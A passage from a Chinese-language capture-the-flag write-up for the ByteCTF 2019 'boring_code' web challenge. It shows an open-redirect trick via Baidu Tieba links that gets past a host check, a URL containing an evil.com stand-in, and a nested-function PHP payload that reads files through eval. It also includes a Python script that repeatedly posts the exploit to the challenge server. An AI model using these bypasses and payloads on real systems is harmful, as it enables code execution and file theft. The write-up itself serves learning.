$code)) &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">'bye~'</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">eval</span>($code);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"error: host not allowed"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"error: invalid url"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="主要两个bypass点"><a href="#主要两个bypass点" class="headerlink" title="主要两个bypass点"></a><strong>主要两个bypass点</strong></h3><h4 id="1-绕过filter-var和parse-url"><a href="#1-绕过filter-var和parse-url" class="headerlink" title="1. 绕过filter_var和parse_url"></a>1. 绕过filter_var和parse_url</h4><h4 id="2-令code在preg-match下进行文件读取"><a href="#2-令code在preg-match下进行文件读取" class="headerlink" title="2. 令code在preg_match下进行文件读取"></a>2. 令code在preg_match下进行文件读取</h4><hr><h2 id="Bypass-0x01"><a href="#Bypass-0x01" class="headerlink" title="Bypass 0x01"></a>Bypass 0x01</h2><hr><p>对于如何绕过filter_var(), preg_match() 和 parse_url()，我找到师傅的一篇<a href="https://www.jianshu.com/p/80ce73919edb" target="_blank" rel="noopener">博客</a>，但这篇博客是针对curl的，在这题貌似并不适用<br>而且对这篇的一个bypass手法我有些懵<br>利用<code>0://evil.com:port;baidu.com:80</code>这样的url（0为传输协议，非http，为了绕过filter_var())<br>curl解析到;停止，这样就访问了<code>0://evil.com:port</code>，但是非http协议的话，比如ftp，我们直接访问<code>ftp://evil.com:port</code>，貌似取不到文件里的内容（先留个坑）</p><p>但还有师傅的wp里说可以ftp协议绕过-.-</p><p><img src= "/img/loading.gif" data-src="/2019/10/22/ByteCTF2019-boring-code/Snipaste_2019-10-22_12-54-35.png" alt></p><p><img src= "/img/loading.gif" data-src="/2019/10/22/ByteCTF2019-boring-code/Snipaste_2019-10-22_12-54-09.png" alt></p><p>那么不选择氪金的话，我们就利用百度的跳转漏洞叭…</p><h3 id="贴吧🏄‍"><a href="#贴吧🏄‍" class="headerlink" title="贴吧🏄‍"></a>贴吧🏄‍</h3><ol><li><p>去贴吧随便找个小贴子，发表评论（评论内容是你要跳转的链接）<br>发布后审查元素看到你发表的链接对应的href<br><img src= "/img/loading.gif" data-src="/2019/10/22/ByteCTF2019-boring-code/Snipaste_2019-10-22_13-06-19.png" alt></p></li><li><p>将jump.bdimg.com改为post.baidu.com后得到的新链接即可直接跳转至你想要的站点</p></li></ol><p>ok第一步bypass成功</p><hr><h2 id="Bypass-0x02"><a href="#Bypass-0x02" class="headerlink" title="Bypass 0x02"></a>Bypass 0x02</h2><hr><p>preg_match限制我们file_get_contents得到的内容只能是a(b(c(d())))这样的格式<br><strong>(?R)指迭代若干次正则表达式整体</strong></p><p><img src= "/img/loading.gif" data-src="/2019/10/22/ByteCTF2019-boring-code/Snipaste_2019-10-22_12-12-16.png" alt></p><p>而且又有一串的黑名单过滤，所以基本放弃getshell，尝试文件读取<br>但由于刚刚说的正则匹配白名单，我们不能传入scandir(‘.’)这样的式子，但这个式子等价scandir(chr(46))，且phpversion()是个数字，我们可以通过一串数学函数把phpversion()转化成我们要的46</p><p>首先探测phpversion信息：</p><p><img src= "/img/loading.gif" data-src="/2019/10/22/ByteCTF2019-boring-code/Snipaste_2019-10-22_00-42-09.png" alt></p><p>发现是5.&#42;版本的php，那就从5/6出发去获得46</p><p>给出数学函数的fuzz脚本（这里利用迭代加深搜索</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">math_fuzz</span><span class="params">($tmp, $goal, $depth = <span class="number">0</span>)</span> </span>&#123;</span><br><span class="line">$math_func = [<span class="string">'sin'</span>, <span class="string">'cos'</span>, <span class="string">'tan'</span>,  <span class="string">'asin'</span>, <span class="string">'acos'</span>, <span class="string">'atan'</span>, <span class="string">'sqrt'</span>, <span class="string">'ceil'</span>, <span class="string">'floor'</span>,<span class="string">'sinh'</span>,<span class="string">'cosh'</span>,<span class="string">'tanh'</span>];</span><br><span class="line"><span class="keyword">if</span>($depth &gt; <span class="number">4</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> [];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>($math_func <span class="keyword">as</span> $func) &#123;</span><br><span class="line"><span class="keyword">if</span>(ceil($func($tmp)) == $goal) &#123;</span><br><span class="line">$res = [];</span><br><span class="line">array_push($res, <span class="string">'ceil'</span>, $func);</span><br><span class="line"><span class="keyword">return</span>  $res;</span><br><span class="line">&#125; <span class="keyword">elseif</span>( floor($func($tmp)) == $goal) &#123;</span><br><span class="line">$res = [];</span><br><span class="line">array_push($res, <span class="string">'floor'</span>, $func);</span><br><span class="line"><span class="keyword">return</span>  $res;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$res = [];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($res = math_fuzz($func($tmp), $goal, $depth + <span class="number">1</span>))) &#123;</span><br><span class="line">array_push($res, $func);</span><br><span class="line"><span class="keyword">return</span> $res;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$orig = <span class="number">5</span>;</span><br><span class="line">$goal = <span class="number">46</span>;</span><br><span class="line">$res = math_fuzz($orig, $goal);</span><br><span class="line"><span class="keyword">foreach</span>($res <span class="keyword">as</span> $func) &#123;</span><br><span class="line"><span class="keyword">print</span> $func.<span class="string">'('</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">print</span> $orig;</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; count($res); $i++) &#123;</span><br><span class="line"><span class="keyword">print</span> <span class="string">')'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">print</span> <span class="string">' = '</span>.$goal.<span class="string">"\n"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>fuzz结果如下图：</p><p><img src= "/img/loading.gif" data-src="/2019/10/22/ByteCTF2019-boring-code/Snipaste_2019-10-22_00-49-17.png" alt></p><p>那么我们就能遍历目录下文件名了，但scandir的返回值是个数组类型，php里能输出数组的几个函数（如var_dump和print_r）在正则匹配白名单下均不可用，所以我们利用readfile+end来读取scandir返回数组的末尾元素里的内容（好像当时比赛有hint</p><p>那么我们就可以构造出如下payload（把跳转链接到的站点内容变为payload）：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readfile(end(scandir(chr(ceil(sinh(cosh(tan(ceil(atan(floor(phpversion())))))))))));</span><br></pre></td></tr></table></figure><p>发包结果</p><p><img src= "/img/loading.gif" data-src="/2019/10/22/ByteCTF2019-boring-code/Snipaste_2019-10-22_00-47-55.png" alt></p><p>但这并不是真正的flag，所以还得继续（flag在父目录里噢<br>我们可以利用scandir(next(scandir(chr(46))))来遍历父目录下文件名，但父目录文件的readfile需要在文件名前加上../（这显然不好实现</p><p>所以我们选择的思路的先chdir切换当前工作目录，再进行文件读取<br>而chdir的返回值是个true（bool类型），那么我们就考虑将整个chdir作为time函数的参数</p><h3 id="time函数浅析"><a href="#time函数浅析" class="headerlink" title="time函数浅析"></a>time函数浅析</h3><p>翻手册我们发现time函数的声明是time(void)，返回int，这个void就给了我们可以任意传值的机会（但可能会有warning，不管看不见</p><p>有了time函数，我们再来看看localtime函数，对于它的函数声明如下</p><p><img src= "/img/loading.gif" data-src="/2019/10/22/ByteCTF2019-boring-code/Snipaste_2019-10-22_13-43-03.png" alt></p><p>localtime(time(true))就能返回一个数组，而这个数组的首位元素就是当前的秒数，那么我们就可以在当前秒数为46时成功再拿到一次chr(46)</p><p>ps：php里取首个元素的函数用pos和current都可（这里采用pos</p><p>给出最终payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(chr(ceil(sinh(cosh(tan(ceil(atan(floor(phpversion()))))))))))))))))));</span><br></pre></td></tr></table></figure><p>再写个py脚本来连续发包</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://47.100.93.189:2512/boring_code.php'</span></span><br><span class="line">data = &#123;<span class="string">'url'</span>: <span class="string">'http://post.baidu.com/safecheck/index?url=x+Z5mMbGPAtT5bBkiEfIO4vDTfcsCssRh5DioYNT33UpgtTWaHrk8IT33QgV1hlBBTwtTfgUQIGUYYnYLaYspm/cr484U4pssMDF8z9+LzC+JwaIavihzSWyZP8Xm7Qhec/AZ+IFwcQwPGbuJnYGNA=='</span>&#125;</span><br><span class="line">s = requests.session()</span><br><span class="line">cur = <span class="number">0</span></span><br><span class="line">rec = <span class="string">'Test[%2d]'</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">cur += <span class="number">1</span></span><br><span class="line">r = s.post(url, data = data)</span><br><span class="line">print(rec%cur)</span><br><span class="line"><span class="keyword">for</span> sub_r <span class="keyword">in</span> re.findall(<span class="string">r"bytectf\&#123;.*?\&#125;"</span>, r.text):</span><br><span class="line">print(sub_r)</span><br><span class="line">exit(<span class="string">'Got it!'</span>)</span><br><span class="line">time.sleep(<span class="number">0.9</span>)</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/2019/10/22/ByteCTF2019-boring-code/2019-10-22-01-51-03-的屏幕截图.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
